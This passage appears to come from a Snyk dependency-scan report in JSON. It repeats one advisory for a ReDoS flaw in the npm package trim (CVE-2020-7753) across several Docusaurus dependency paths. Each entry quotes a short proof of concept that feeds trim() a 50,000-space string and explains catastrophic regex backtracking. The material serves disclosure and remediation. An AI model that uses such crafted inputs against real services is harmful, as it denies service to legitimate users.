          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2022-04-27T01:10:40.520960Z"
        }
      ],
      "description": "## Overview\n[trim](https://www.npmjs.com/package/trim) is a Trim string whitespace\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the `trim()` method. \r\n\r\n## PoC by Liyuan Chen: \r\n```js\r\nvar trim = require(\"trim\")\r\n\r\nfunction build_attack (n) {\r\nvar ret = \"1\"\r\nfor (var i = 0; i < n; i++) {\r\nret += \" \"\r\n}\r\n\r\nreturn ret + \"1\";\r\n}\r\nvar time = Date.now();\r\ntrim(build_attack(50000))\r\nvar time_cost = Date.now() - time;\r\nconsole.log(\"time_cost: \" + time_cost)\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `trim` to version 0.0.3 or higher.\n## References\n- [GitHub PR](https://github.com/component/trim/pull/8)\n- [Vulnerable Code](https://github.com/component/trim/blob/master/index.js#L6)\n",
      "epssDetails": {
        "percentile": "0.76131",
        "probability": "0.00632",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2020-7753"
        ],
        "CWE": [
          "CWE-400"
        ],
        "GHSA": [
          "GHSA-w5p7-h5w8-2hfq"
        ]
      },
      "packageName": "trim",
      "proprietary": true,
      "creationTime": "2020-10-11T10:28:41.769555Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2020-10-11T10:24:13Z",
      "packageManager": "npm",
      "publicationTime": "2020-10-27T15:51:30Z",
      "modificationTime": "2023-06-22T11:01:33.385085Z",
      "socialTrendAlert": false,
      "severityWithCritical": "high",
      "packagePopularityRank": 99,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/theme-classic@2.2.0",
        "@docusaurus/theme-common@2.2.0",
        "@docusaurus/plugin-content-blog@2.2.0",
        "@docusaurus/mdx-loader@2.2.0",
        "@mdx-js/mdx@1.6.22",
        "remark-parse@8.0.3",
        "trim@0.0.1"
      ],
      "upgradePath": [
        false,
        false,
        false,
        false,
        false,
        false,
        false,
        "remark-parse@9.0.0"
      ],
      "version": "0.0.1",
      "name": "trim",
      "isUpgradable": false,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-TRIM-1017038",
      "title": "Regular Expression Denial of Service (ReDoS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
      "credit": [
        "Liyuan Chen"
      ],
      "semver": {
        "vulnerable": [
          "<0.0.3"
        ]
      },
      "exploit": "Proof of Concept",
      "fixedIn": [
        "0.0.3"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "high",
      "cvssScore": 7.5,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "trim",
      "references": [
        {
          "url": "https://github.com/component/trim/pull/8",
          "title": "GitHub PR"
        },
        {
          "url": "https://github.com/component/trim/blob/master/index.js%23L6",
          "title": "Vulnerable Code"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "SUSE",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2023-06-22T11:01:33.385085Z"
        },
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2022-04-27T01:10:40.520960Z"
        }
      ],
      "description": "## Overview\n[trim](https://www.npmjs.com/package/trim) is a Trim string whitespace\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the `trim()` method. \r\n\r\n## PoC by Liyuan Chen: \r\n```js\r\nvar trim = require(\"trim\")\r\n\r\nfunction build_attack (n) {\r\nvar ret = \"1\"\r\nfor (var i = 0; i < n; i++) {\r\nret += \" \"\r\n}\r\n\r\nreturn ret + \"1\";\r\n}\r\nvar time = Date.now();\r\ntrim(build_attack(50000))\r\nvar time_cost = Date.now() - time;\r\nconsole.log(\"time_cost: \" + time_cost)\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `trim` to version 0.0.3 or higher.\n## References\n- [GitHub PR](https://github.com/component/trim/pull/8)\n- [Vulnerable Code](https://github.com/component/trim/blob/master/index.js#L6)\n",
      "epssDetails": {
        "percentile": "0.76131",
        "probability": "0.00632",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2020-7753"
        ],
        "CWE": [
          "CWE-400"
        ],
        "GHSA": [
          "GHSA-w5p7-h5w8-2hfq"
        ]
      },
      "packageName": "trim",
      "proprietary": true,
      "creationTime": "2020-10-11T10:28:41.769555Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2020-10-11T10:24:13Z",
      "packageManager": "npm",
      "publicationTime": "2020-10-27T15:51:30Z",
      "modificationTime": "2023-06-22T11:01:33.385085Z",
      "socialTrendAlert": false,
      "severityWithCritical": "high",
      "packagePopularityRank": 99,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/theme-search-algolia@2.2.0",
        "@docusaurus/theme-common@2.2.0",
        "@docusaurus/plugin-content-blog@2.2.0",
        "@docusaurus/mdx-loader@2.2.0",
        "@mdx-js/mdx@1.6.22",
        "remark-parse@8.0.3",
        "trim@0.0.1"
      ],
      "upgradePath": [
        false,
        false,
        false,
        false,
        false,
        false,
        false,
        "remark-parse@9.0.0"
      ],
      "version": "0.0.1",
      "name": "trim",
      "isUpgradable": false,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-TRIM-1017038",
      "title": "Regular Expression Denial of Service (ReDoS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
      "credit": [
        "Liyuan Chen"
      ],
      "semver": {
        "vulnerable": [
          "<0.0.3"
        ]
      },
      "exploit": "Proof of Concept",
      "fixedIn": [
        "0.0.3"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "high",
      "cvssScore": 7.5,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "trim",
      "references": [
        {
          "url": "https://github.com/component/trim/pull/8",
          "title": "GitHub PR"
        },
        {
          "url": "https://github.com/component/trim/blob/master/index.js%23L6",
          "title": "Vulnerable Code"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "SUSE",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2023-06-22T11:01:33.385085Z"
        },
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2022-04-27T01:10:40.520960Z"
        }
      ],
      "description": "## Overview\n[trim](https://www.npmjs.com/package/trim) is a Trim string whitespace\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the `trim()` method. \r\n\r\n## PoC by Liyuan Chen: \r\n```js\r\nvar trim = require(\"trim\")\r\n\r\nfunction build_attack (n) {\r\nvar ret = \"1\"\r\nfor (var i = 0; i < n; i++) {\r\nret += \" \"\r\n}\r\n\r\nreturn ret + \"1\";\r\n}\r\nvar time = Date.now();\r\ntrim(build_attack(50000))\r\nvar time_cost = Date.now() - time;\r\nconsole.log(\"time_cost: \" + time_cost)\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `trim` to version 0.0.3 or higher.\n## References\n- [GitHub PR](https://github.com/component/trim/pull/8)\n- [Vulnerable Code](https://github.com/component/trim/blob/master/index.js#L6)\n",
      "epssDetails": {
        "percentile": "0.76131",
        "probability": "0.00632",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2020-7753"
        ],
        "CWE": [
          "CWE-400"
        ],
        "GHSA": [
          "GHSA-w5p7-h5w8-2hfq"
        ]
      },
      "packageName": "trim",
      "proprietary": true,
      "creationTime": "2020-10-11T10:28:41.769555Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2020-10-11T10:24:13Z",
      "packageManager": "npm",
      "publicationTime": "2020-10-27T15:51:30Z",
      "modificationTime": "2023-06-22T11:01:33.385085Z",
      "socialTrendAlert": false,
      "severityWithCritical": "high",
      "packagePopularityRank": 99,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/theme-classic@2.2.0",
        "@docusaurus/theme-common@2.2.0",
        "@docusaurus/plugin-content-docs@2.2.0",
        "@docusaurus/mdx-loader@2.2.0",
        "@mdx-js/mdx@1.6.22",
        "remark-parse@8.0.3",
        "trim@0.0.1"
      ],
      "upgradePath": [
        false,
        false,
        false,
        false,
        false,
        false,
        false,
        "remark-parse@9.0.0"
      ],
      "version": "0.0.1",
      "name": "trim",
      "isUpgradable": false,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-TRIM-1017038",
      "title": "Regular Expression Denial of Service (ReDoS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
      "credit": [
        "Liyuan Chen"
      ],
      "semver": {
        "vulnerable": [
          "<0.0.3"
        ]
      },
      "exploit": "Proof of Concept",
      "fixedIn": [
        "0.0.3"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "high",
      "cvssScore": 7.5,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "trim",
      "references": [
        {
          "url": "https://github.com/component/trim/pull/8",
          "title": "GitHub PR"
        },
        {
          "url": "https://github.com/component/trim/blob/master/index.js%23L6",
          "title": "Vulnerable Code"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "SUSE",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2023-06-22T11:01:33.385085Z"
        },
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2022-04-27T01:10:40.520960Z"
        }
      ],
      "description": "## Overview\n[trim](https://www.npmjs.com/package/trim) is a Trim string whitespace\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the `trim()` method. \r\n\r\n## PoC by Liyuan Chen: \r\n```js\r\nvar trim = require(\"trim\")\r\n\r\nfunction build_attack (n) {\r\nvar ret = \"1\"\r\nfor (var i = 0; i < n; i++) {\r\nret += \" \"\r\n}\r\n\r\nreturn ret + \"1\";\r\n}\r\nvar time = Date.now();\r\ntrim(build_attack(50000))\r\nvar time_cost = Date.now() - time;\r\nconsole.log(\"time_cost: \" + time_cost)\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `trim` to version 0.0.3 or higher.\n## References\n- [GitHub PR](https://github.com/component/trim/pull/8)\n- [Vulnerable Code](https://github.com/component/trim/blob/master/index.js#L6)\n",
      "epssDetails": {
        "percentile": "0.76131",
        "probability": "0.00632",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2020-7753"
        ],
        "CWE": [
          "CWE-400"
        ],
        "GHSA": [
          "GHSA-w5p7-h5w8-2hfq"
        ]
      },
      "packageName": "trim",
      "proprietary": true,
      "creationTime": "2020-10-11T10:28:41.769555Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2020-10-11T10:24:13Z",
      "packageManager": "npm",
      "publicationTime": "2020-10-27T15:51:30Z",
      "modificationTime": "2023-06-22T11:01:33.385085Z",
      "socialTrendAlert": false,
      "severityWithCritical": "high",
      "packagePopularityRank": 99,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/theme-search-algolia@2.2.0",
        "@docusaurus/theme-common@2.2.0",
        "@docusaurus/plugin-content-docs@2.2.0",
        "@docusaurus/mdx-loader@2.2.0",
        "@mdx-js/mdx@1.6.22",
        "remark-parse@8.0.3",
        "trim@0.0.1"
      ],
      "upgradePath": [
        false,
        false,
        false,
        false,
        false,
        false,
        false,
        "remark-parse@9.0.0"
      ],
      "version": "0.0.1",
      "name": "trim",
      "isUpgradable": false,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-TRIM-1017038",
      "title": "Regular Expression Denial of Service (ReDoS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
      "credit": [
        "Liyuan Chen"
      ],
      "semver": {
        "vulnerable": [
          "<0.0.3"
        ]
      },
      "exploit": "Proof of Concept",
      "fixedIn": [
        "0.0.3"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "high",
      "cvssScore": 7.5,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "trim",
      "references": [
        {
          "url": "https://github.com/component/trim/pull/8",
          "title": "GitHub PR"
        },
        {
          "url": "https://github.com/component/trim/blob/master/index.js%23L6",
          "title": "Vulnerable Code"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "SUSE",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2023-06-22T11:01:33.385085Z"
        },
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2022-04-27T01:10:40.520960Z"
        }
      ],
      "description": "## Overview\n[trim](https://www.npmjs.com/package/trim) is a Trim string whitespace\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the `trim()` method. \r\n\r\n## PoC by Liyuan Chen: \r\n```js\r\nvar trim = require(\"trim\")\r\n\r\nfunction build_attack (n) {\r\nvar ret = \"1\"\r\nfor (var i = 0; i < n; i++) {\r\nret += \" \"\r\n}\r\n\r\nreturn ret + \"1\";\r\n}\r\nvar time = Date.now();\r\ntrim(build_attack(50000))\r\nvar time_cost = Date.now() - time;\r\nconsole.log(\"time_cost: \" + time_cost)\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `trim` to version 0.0.3 or higher.\n## References\n- [GitHub PR](https://github.com/component/trim/pull/8)\n- [Vulnerable Code](https://github.com/component/trim/blob/master/index.js#L6)\n",
      "epssDetails": {
        "percentile": "0.76131",
        "probability": "0.00632",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2020-7753"
        ],
        "CWE": [
          "CWE-400"
        ],
        "GHSA": [
          "GHSA-w5p7-h5w8-2hfq"
        ]
      },
      "packageName": "trim",
      "proprietary": true,
      "creationTime": "2020-10-11T10:28:41.769555Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2020-10-11T10:24:13Z",
      "packageManager": "npm",
      "publicationTime": "2020-10-27T15:51:30Z",
      "modificationTime": "2023-06-22T11:01:33.385085Z",
      "socialTrendAlert": false,
